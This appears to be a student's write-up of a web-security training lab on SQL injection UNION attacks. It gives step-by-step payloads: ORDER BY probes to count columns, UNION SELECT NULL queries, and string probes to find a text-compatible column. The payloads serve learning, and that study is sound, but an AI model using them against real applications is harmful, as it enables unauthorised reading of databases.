Created By: Achmad
Year: 2022

Lab: SQL injection UNION attack, finding a column containing text

QUESTION:
    This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables. To construct such an attack, you first need to determine the number of columns returned by the query. You can do this using a technique you learned in a previous lab. The next step is to identify a column that is compatible with string data.

    The lab will provide a random value that you need to make appear within the query results. To solve the lab, perform an SQL injection UNION attack that returns an additional row containing the value provided. This technique helps you determine which columns are compatible with string data. 

=======================================
ANALYSIS:
-GOALS: determine the number of columns with datatype number and string with UNION attack

SIMPLE LOGIC UNION:
- SELECT a, b, c FROM table1

-SOLVE: 
1. We don't know, how many columns are displayed on the web. Use ORDER BY [NUMBER] or ORDER BY 1 to count the number of columns displayed. IF when calculating an error occurs then the column number has been skipped.
__________________
|  ' ORDER BY 1-- |
|  ' ORDER BY 2-- |
|  ' ORDER BY 3-- |
|__etc.___________|

2. Use UNION to combine SELECT query with column NULL
3. merge by commenting the query behind it: ' UNION SELECT NULL,NULL,NULL -- "USE SPCASE FOR GENERAL COMMENT"
4. Use the law of propability in the query to determine the data types of string and number
_______________________________________
|   ' UNION SELECT 'a',NULL,NULL--     |
|   ' UNION SELECT NULL,'a',NULL--     |
|   ' UNION SELECT NULL,NULL,'a'--     |
|___etc._______________________________|


FULL LOGIC UNION:
- SELECT a, b, c FROM table1 UNION SELECT NULL, 'oNIppJ', NULL
